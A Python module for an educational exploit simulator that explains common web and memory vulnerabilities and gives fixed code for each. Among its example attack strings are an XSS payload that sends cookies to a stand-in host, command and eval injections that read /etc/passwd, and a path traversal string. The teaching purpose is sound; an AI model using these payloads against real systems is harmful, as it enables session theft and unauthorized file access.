"""
Exploit simulator for educational purposes.
This module provides functionality to simulate how vulnerabilities can be exploited.
"""

import re
import json
import html
import subprocess
from typing import Dict, List, Optional, Tuple, Any
import traceback
import io
from contextlib import redirect_stdout, redirect_stderr

class ExploitSimulator:
    """
    Simulates exploits against common vulnerabilities for educational purposes.
    This is intended to help developers understand how vulnerabilities can be exploited.
    """
    
    def __init__(self):
        """Initialize the exploit simulator with supported vulnerability types."""
        # Map vulnerability types to their simulation methods
        self.simulation_map = {
            "SQL Injection Risk": self.simulate_sql_injection,
            "XSS Risk": self.simulate_xss,
            "Command Injection Risk": self.simulate_command_injection,
            "Eval Usage": self.simulate_eval_execution,
            "Hardcoded Password/API Key": self.simulate_credential_theft,
            "Path Traversal": self.simulate_path_traversal,
            "Insecure Random Number Generation": self.simulate_predictable_random,
            "Buffer Overflow Risk": self.simulate_buffer_overflow
        }
        
    def get_supported_vulnerabilities(self) -> List[str]:
        """Get list of vulnerability types supported by the simulator."""
        return list(self.simulation_map.keys())
    
    def simulate_exploit(self, code: str, vulnerability_type: str, language: str) -> Dict:
        """
        Simulate an exploit against the given code for the specified vulnerability type.
        
        Args:
            code: The vulnerable code
            vulnerability_type: Type of vulnerability to exploit
            language: Programming language of the code
            
        Returns:
            Dictionary with simulation results
        """
        try:
            if vulnerability_type in self.simulation_map:
                return self.simulation_map[vulnerability_type](code, language)
            else:
                return {
                    "success": False,
                    "message": f"Simulation not available for {vulnerability_type}",
                    "details": {}
                }
        except Exception as e:
            return {
                "success": False,
                "message": f"Error during simulation: {str(e)}",
                "details": {"traceback": traceback.format_exc()}
            }
    
    def simulate_sql_injection(self, code: str, language: str) -> Dict:
        """Simulate SQL injection vulnerability exploitation."""
        # Extract username query parameter from code
        param_match = re.search(r'(username|user|name)\s*=\s*([^\s;]+)', code, re.IGNORECASE)
        
        if not param_match:
            return {"success": False, "message": "Could not identify username parameter in code"}
            
        # Craft SQL injection attack
        attack_vector = "' OR '1'='1"
        exploit_input = attack_vector
        
        # Simulate results
        attack_description = (
            "An attacker injects malicious SQL code via the input field, "
            "manipulating the query to always return true ('1'='1'), bypassing authentication."
        )
        
        # Simulate the query that would be executed
        original_query = "SELECT * FROM users WHERE username = 'input' AND password = 'password'"
        exploited_query = f"SELECT * FROM users WHERE username = '{attack_vector}' AND password = 'password'"
        
        # Simulate the consequences
        consequences = [
            "Authentication bypass: Attacker gains access without valid credentials",
            "Data breach: All user records may be exposed",
            "Database corruption: Malicious queries could modify or delete data"
        ]
        
        # Fixed version - using parameterized queries
        fixed_code = None
        if language == "python":
            fixed_code = """
# Use parameterized queries to prevent SQL injection
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", 
               (username, password))
"""
        elif language in ["javascript", "js"]:
            fixed_code = """
// Use parameterized queries with prepared statements
const query = "SELECT * FROM users WHERE username = ? AND password = ?";
db.execute(query, [username, password]);
"""
        
        return {
            "success": True,
            "vulnerability_type": "SQL Injection",
            "attack_vector": attack_vector,
            "attack_description": attack_description,
            "original_operation": original_query,
            "exploited_operation": exploited_query,
            "consequences": consequences,
            "fixed_code": fixed_code,
            "visualization": {
                "steps": [
                    {"step": 1, "description": "User inputs malicious string in login form", "code": f"username = '{attack_vector}'"},
                    {"step": 2, "description": "Application forms SQL query with unfiltered input", "code": exploited_query},
                    {"step": 3, "description": "Database interprets `OR '1'='1` as always TRUE", "code": "WHERE clause always evaluates to TRUE"}
                ]
            }
        }
        
    def simulate_xss(self, code: str, language: str) -> Dict:
        """Simulate Cross-Site Scripting (XSS) vulnerability exploitation."""
        # Craft XSS attack vector
        attack_vector = "<script>document.location='http://evil-site.com/steal.php?cookie='+document.cookie</script>"
        
        # Simulate the unsafe rendering in a web page
        original_output = "Welcome, [user input]!"
        exploited_output = f"Welcome, {attack_vector}!"
        
        # Attack description
        attack_description = (
            "An attacker injects malicious JavaScript code via a form field. "
            "When the page renders the unfiltered input, the script executes in users' browsers, "
            "stealing their cookies and sending them to the attacker's server."
        )
        
        # Consequences
        consequences = [
            "Session hijacking: Attacker can steal user sessions",
            "Credential theft: Attacker may access sensitive user information",
            "Malware distribution: Attacker can redirect users to malicious sites"
        ]
        
        # Fixed version - using proper HTML escaping
        fixed_code = None
        if language == "python":
            fixed_code = """
# Flask example with proper escaping
@app.route('/welcome')
def welcome():
    # escape user input to prevent XSS
    username = escape(request.args.get('username', ''))
    return render_template('welcome.html', username=username)
"""
        elif language in ["javascript", "js"]:
            fixed_code = """
// React example with safe rendering
function Welcome(props) {
  // React automatically escapes variables in JSX
  return <div>Welcome, {props.username}!</div>;
}
"""
        
        return {
            "success": True,
            "vulnerability_type": "Cross-Site Scripting (XSS)",
            "attack_vector": attack_vector,
            "attack_description": attack_description,
            "original_operation": original_output,
            "exploited_operation": exploited_output,
            "consequences": consequences,
            "fixed_code": fixed_code,
            "visualization": {
                "steps": [
                    {"step": 1, "description": "User inputs malicious script in form", "code": attack_vector},
                    {"step": 2, "description": "Application renders unfiltered input in HTML", "code": exploited_output},
                    {"step": 3, "description": "Browser executes injected script, stealing cookies", "code": "document.location='http://evil-site.com/steal.php?cookie='+document.cookie"}
                ]
            }
        }
        
    def simulate_command_injection(self, code: str, language: str) -> Dict:
        """Simulate command injection vulnerability exploitation."""
        # Extract command from code
        cmd_match = re.search(r'(system|exec|popen|subprocess\.call)\s*\(\s*[\'"]([^\'"]+)[\'"]', code, re.IGNORECASE)
        
        if not cmd_match:
            cmd = "ping"
        else:
            cmd = cmd_match.group(2)
            
        # Craft command injection attack
        attack_vector = f"; cat /etc/passwd"
        exploit_input = f"{cmd} {attack_vector}"
        
        # Simulate results
        attack_description = (
            "An attacker appends malicious commands to a legitimate command using shell metacharacters. "
            "The application executes both the intended command and the injected commands with its privileges."
        )
        
        # Simulate the command that would be executed
        original_cmd = f"{cmd} example.com"
        exploited_cmd = f"{cmd} example.com; cat /etc/passwd"
        
        # Consequences
        consequences = [
            "Unauthorized access: Attacker can read sensitive files",
            "System compromise: Attacker may execute arbitrary commands",
            "Data breach: Attacker can exfiltrate information from the system"
        ]
        
        # Fixed version - using command argument lists instead of shell=True
        fixed_code = None
        if language == "python":
            fixed_code = """
# Use argument lists instead of shell=True
import subprocess
# Instead of: subprocess.call(f"ping {user_input}", shell=True)
subprocess.call(["ping", user_input])  # No shell interpretation of special characters
"""
        elif language in ["javascript", "js"]:
            fixed_code = """
// Node.js - Use argument arrays with execFile instead of exec
const { execFile } = require('child_process');
// Instead of: exec(`ping ${userInput}`)
execFile('ping', [userInput], (error, stdout, stderr) => {
  // Handle output safely
});
"""
        
        return {
            "success": True,
            "vulnerability_type": "Command Injection",
            "attack_vector": attack_vector,
            "attack_description": attack_description,
            "original_operation": original_cmd,
            "exploited_operation": exploited_cmd,
            "consequences": consequences,
            "fixed_code": fixed_code,
            "visualization": {
                "steps": [
                    {"step": 1, "description": "User inputs command with malicious append", "code": exploit_input},
                    {"step": 2, "description": "Application passes unfiltered input to shell", "code": f"system(\"{exploited_cmd}\")"},
                    {"step": 3, "description": "Shell interprets ';' as command separator", "code": "Executes both original and injected commands"}
                ]
            }
        }
    
    def simulate_eval_execution(self, code: str, language: str) -> Dict:
        """Simulate eval injection vulnerability exploitation."""
        # Craft eval injection attack
        attack_vector = "'; import os; os.system('cat /etc/passwd'); '"
        
        # Simulate results
        attack_description = (
            "An attacker injects malicious code via input that is passed to an eval() function. "
            "The code executes with the privileges of the application, allowing arbitrary code execution."
        )
        
        # Simulate the eval calls
        original_eval = "eval('2 + 2')"
        exploited_eval = f"eval('{attack_vector}')"
        
        # Consequences
        consequences = [
            "Arbitrary code execution: Attacker can run any code in the application context",
            "System compromise: Attacker may access sensitive resources",
            "Data manipulation: Attacker can modify application data"
        ]
        
        # Fixed version - avoid using eval entirely
        fixed_code = None
        if language == "python":
            fixed_code = """
# Instead of eval(user_input), use safer alternatives:
import ast
def safe_eval(expr):
    # Only allow simple arithmetic expressions
    try:
        parsed = ast.parse(expr, mode='eval')
        # Check if the AST contains only allowed operations
        for node in ast.walk(parsed):
            if isinstance(node, (ast.BinOp, ast.UnaryOp, ast.Num)):
                continue
            else:
                raise ValueError("Unsafe operation in expression")
        # Compile and evaluate if safe
        return eval(compile(parsed, '<string>', 'eval'))
    except Exception as e:
        return f"Error: {str(e)}"
        
# Or better yet, use a dedicated expression parser like 'simpleeval'
"""
        elif language in ["javascript", "js"]:
            fixed_code = """
// Instead of eval(userInput), use safer alternatives:
// For JSON parsing:
try {
  const data = JSON.parse(jsonString);
} catch (e) {
  console.error('Invalid JSON');
}

// For mathematical expressions, use a math library like mathjs:
// import * as math from 'mathjs';
// const result = math.evaluate(safeExpression);
"""
        
        return {
            "success": True,
            "vulnerability_type": "Eval Injection",
            "attack_vector": attack_vector,
            "attack_description": attack_description,
            "original_operation": original_eval,
            "exploited_operation": exploited_eval,
            "consequences": consequences,
            "fixed_code": fixed_code,
            "visualization": {
                "steps": [
                    {"step": 1, "description": "User inputs malicious Python code", "code": attack_vector},
                    {"step": 2, "description": "Application passes unfiltered input to eval()", "code": f"eval(user_input) # where user_input = '{attack_vector}'"},
                    {"step": 3, "description": "Python interpreter executes the injected code", "code": "import os; os.system('cat /etc/passwd')"}
                ]
            }
        }
        
    def simulate_credential_theft(self, code: str, language: str) -> Dict:
        """Simulate hardcoded credential theft."""
        # Extract credential from code
        cred_match = re.search(r'(password|api_?key|secret|token)\s*=\s*[\'"]([^\'"]+)[\'"]', code, re.IGNORECASE)
        
        credential = "secret123"
        if cred_match:
            credential_type = cred_match.group(1)
            credential = cred_match.group(2)
        else:
            credential_type = "password"
            
        # Simulate results
        attack_description = (
            "An attacker gains access to the source code (via repository, decompilation, etc.) "
            "and extracts hardcoded credentials directly from the code."
        )
        
        # Simulate the credential exposure
        original_code = f"{credential_type} = '{credential}'"
        exposure = f"Found {credential_type}: {credential}"
        
        # Consequences
        consequences = [
            "Unauthorized access: Attacker can access protected resources",
            "Account takeover: Attacker may impersonate legitimate users",
            "Data breach: Attacker can exfiltrate sensitive information"
        ]
        
        # Fixed version - using environment variables or secure storage
        fixed_code = None
        if language == "python":
            fixed_code = """
# Use environment variables instead of hardcoded credentials
import os
password = os.environ.get('APP_PASSWORD')
api_key = os.environ.get('API_KEY')

# Or use a secure credential manager
from keyvault import KeyVault
password = KeyVault.get_secret('app-password')
"""
        elif language in ["javascript", "js"]:
            fixed_code = """
// Use environment variables instead of hardcoded credentials
const password = process.env.APP_PASSWORD;
const apiKey = process.env.API_KEY;

// In a browser context, use a secure credential manager service
async function getCredentials() {
  const credentials = await credentialService.getSecrets(['app-password']);
  return credentials;
}
"""
        
        return {
            "success": True,
            "vulnerability_type": "Hardcoded Credentials",
            "attack_vector": "Source code access",
            "attack_description": attack_description,
            "original_operation": original_code,
            "exploited_operation": exposure,
            "consequences": consequences,
            "fixed_code": fixed_code,
            "visualization": {
                "steps": [
                    {"step": 1, "description": "Attacker gains access to source code", "code": "git clone https://github.com/example/vulnerable-app.git"},
                    {"step": 2, "description": "Attacker searches for credential patterns", "code": "grep -r 'password\\|api_key\\|secret' ."},
                    {"step": 3, "description": "Attacker finds and extracts credentials", "code": exposure}
                ]
            }
        }
        
    def simulate_path_traversal(self, code: str, language: str) -> Dict:
        """Simulate path traversal vulnerability exploitation."""
        # Craft path traversal attack
        attack_vector = "../../../etc/passwd"
        
        # Simulate results
        attack_description = (
            "An attacker manipulates file paths using '../' sequences to access files outside "
            "the intended directory, potentially reaching sensitive system files."
        )
        
        # Simulate the file access
        original_access = "open('files/user_data.txt', 'r')"
        exploited_access = f"open('files/{attack_vector}', 'r')"
        
        # Consequences
        consequences = [
            "Unauthorized file access: Attacker can read sensitive files",
            "Information disclosure: System configuration and user data may be exposed",
            "Service disruption: Attacker might access and modify critical files"
        ]
        
        # Fixed version - validating and sanitizing file paths
        fixed_code = None
        if language == "python":
            fixed_code = """
import os
from pathlib import Path

def safe_open_file(filename):
    # Define allowed base directory
    base_dir = Path('/var/www/app/files')
    
    # Resolve the full path and ensure it's within the base directory
    try:
        file_path = base_dir / filename
        # Convert to absolute and resolve symlinks
        resolved_path = file_path.resolve(strict=True)
        
        # Verify the path is within the base directory
        if base_dir in resolved_path.parents or resolved_path == base_dir:
            return open(resolved_path, 'r')
        else:
            raise ValueError("Access denied: Path outside allowed directory")
    except (ValueError, FileNotFoundError):
        return "File not found or access denied"
"""
        elif language in ["javascript", "js"]:
            fixed_code = """
const path = require('path');
const fs = require('fs');

function safeReadFile(filename) {
  // Define allowed base directory
  const baseDir = path.resolve('/var/www/app/files');
  
  try {
    // Resolve the full path
    const filePath = path.join(baseDir, filename);
    const resolvedPath = path.resolve(filePath);
    
    // Verify the path is within the base directory
    if (!resolvedPath.startsWith(baseDir)) {
      throw new Error('Access denied: Path outside allowed directory');
    }
    
    // Safe to read the file
    return fs.readFileSync(resolvedPath, 'utf8');
  } catch (err) {
    return 'File not found or access denied';
  }
}
"""
        
        return {
            "success": True,
            "vulnerability_type": "Path Traversal",
            "attack_vector": attack_vector,
            "attack_description": attack_description,
            "original_operation": original_access,
            "exploited_operation": exploited_access,
            "consequences": consequences,
            "fixed_code": fixed_code,
            "visualization": {
                "steps": [
                    {"step": 1, "description": "User requests file with malicious path", "code": f"GET /files?name={attack_vector}"},
                    {"step": 2, "description": "Application passes unvalidated path to file system", "code": exploited_access},
                    {"step": 3, "description": "File system resolves '../' sequences", "code": "Accessing /etc/passwd instead of intended file"}
                ]
            }
        }
        
    def simulate_predictable_random(self, code: str, language: str) -> Dict:
        """Simulate insecure random number generation exploitation."""
        # Simulate results
        attack_description = (
            "An attacker exploits weak random number generation to predict outcomes, "
            "which can affect security features like session IDs, tokens, or encryption keys."
        )
        
        # Extract the random generation method
        if language == "python":
            random_example = "import random\ntoken = ''.join(random.choice('0123456789ABCDEF') for i in range(16))"
            prediction_example = "# Attackers can predict the next outputs of random()\nimport random\nrandom.seed(1)  # If seed is known or default\npredicted_numbers = [random.randint(1, 100) for _ in range(5)]"
        else:
            random_example = "let token = '';\nfor (let i = 0; i < 16; i++) {\n  token += '0123456789ABCDEF'.charAt(Math.floor(Math.random() * 16));\n}"
            prediction_example = "// Attackers can predict the outputs of Math.random()\n// If the seed could be determined\nlet predictedTokens = [];  // In reality, JavaScript doesn't expose the seed"
            
        # Consequences
        consequences = [
            "Token prediction: Attacker can guess authentication tokens",
            "Session hijacking: Attacker may take over user sessions",
            "Cryptographic weaknesses: Predictable keys lead to broken encryption"
        ]
        
        # Fixed version - using cryptographically strong random generation
        fixed_code = None
        if language == "python":
            fixed_code = """
# Use cryptographically strong random generation
import secrets

# Generate a secure token
token = secrets.token_hex(16)  # 32 hex characters (16 bytes)

# For integer ranges
secure_number = secrets.randbelow(100)  # 0 to 99
"""
        elif language in ["javascript", "js"]:
            fixed_code = """
// Use the Web Crypto API for cryptographically strong random values
const array = new Uint8Array(16);
crypto.getRandomValues(array);

// Convert to hex string if needed
const token = Array.from(array)
  .map(b => b.toString(16).padStart(2, '0'))
  .join('');
"""
        
        return {
            "success": True,
            "vulnerability_type": "Insecure Randomness",
            "attack_vector": "Predictable random number generation",
            "attack_description": attack_description,
            "original_operation": random_example,
            "exploited_operation": prediction_example,
            "consequences": consequences,
            "fixed_code": fixed_code,
            "visualization": {
                "steps": [
                    {"step": 1, "description": "Application generates tokens with weak RNG", "code": random_example},
                    {"step": 2, "description": "Attacker analyzes pattern or determines seed", "code": "Analyzing tokens: 3FA8D2, 9C1E7B, 0D4F32..."},
                    {"step": 3, "description": "Attacker predicts future tokens", "code": prediction_example}
                ]
            }
        }
        
    def simulate_buffer_overflow(self, code: str, language: str) -> Dict:
        """Simulate buffer overflow vulnerability exploitation."""
        # This is mostly relevant for C/C++
        if language not in ["c", "cpp", "c++"]:
            language = "c"  # Default to C for the example
            
        # Craft buffer overflow attack
        attack_vector = 'A' * 100 + '\\x41\\x42\\x43\\x44'  # Overflow + memory address
        
        # Simulate results
        attack_description = (
            "An attacker sends input larger than the allocated buffer size. "
            "The excess data overwrites adjacent memory, potentially including return addresses, "
            "allowing execution flow manipulation or code execution."
        )
        
        # Simulate the vulnerable code
        vulnerable_code = """
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking
    printf("Input: %s\\n", buffer);
}
"""
        
        exploited_result = """
// Input overflows 64-byte buffer, overwriting stack data:
// [64 bytes buffer][SFP][Return Address][Other stack data]
//                        ↑
//                        Overwritten with attacker-controlled data
"""
        
        # Consequences
        consequences = [
            "Arbitrary code execution: Attacker can execute injected code",
            "Program crash: Stack corruption leads to application failure",
            "Memory disclosure: Adjacent memory contents may be exposed"
        ]
        
        # Fixed version - using safer alternatives with bounds checking
        fixed_code = """
void secure_function(char *input) {
    char buffer[64];
    // Option 1: Use strncpy with explicit null termination
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\\0';
    
    // Option 2: Use safer string functions
    // strlcpy(buffer, input, sizeof(buffer));  // BSD/macOS
    
    // Option 3: Check length before copying
    if (strlen(input) < sizeof(buffer)) {
        strcpy(buffer, input);
    } else {
        printf("Input too long!\\n");
    }
    
    printf("Input: %s\\n", buffer);
}
"""
        
        return {
            "success": True,
            "vulnerability_type": "Buffer Overflow",
            "attack_vector": attack_vector,
            "attack_description": attack_description,
            "original_operation": vulnerable_code,
            "exploited_operation": exploited_result,
            "consequences": consequences,
            "fixed_code": fixed_code,
            "visualization": {
                "steps": [
                    {"step": 1, "description": "Attacker sends oversized input to vulnerable function", "code": f"vulnerable_function(\"{attack_vector}\");"},
                    {"step": 2, "description": "Input overflows the 64-byte buffer", "code": "strcpy(buffer, input); // buffer[64] <- 100+ bytes"},
                    {"step": 3, "description": "Excess data overwrites return address", "code": "Memory: [buffer:64 bytes][SFP:4 bytes][Return Addr:4 bytes] <- overwritten"}
                ]
            }
        }
    
    def execute_safe_python(self, code: str, input_data: str = "") -> Dict:
        """
        Execute Python code in a sandboxed environment for demonstration purposes.
        
        This is extremely limited and only for basic demonstration.
        Do not use this for running untrusted code in production.
        """
        # Create a highly restricted environment
        safe_globals = {
            'print': print,
            'str': str,
            'len': len,
            'int': int,
            'float': float,
            'list': list,
            'dict': dict,
            'range': range,
            'input': lambda _=None: input_data
        }
        
        # Capture stdout and stderr
        out = io.StringIO()
        err = io.StringIO()
        result = None
        
        try:
            with redirect_stdout(out), redirect_stderr(err):
                # Execute with timeout and restricted environment
                code_obj = compile(code, '<string>', 'exec')
                exec(code_obj, safe_globals)
                
            return {
                "success": True,
                "output": out.getvalue(),
                "error": err.getvalue()
            }
        except Exception as e:
            return {
                "success": False,
                "output": out.getvalue(),
                "error": f"{type(e).__name__}: {str(e)}"
            } 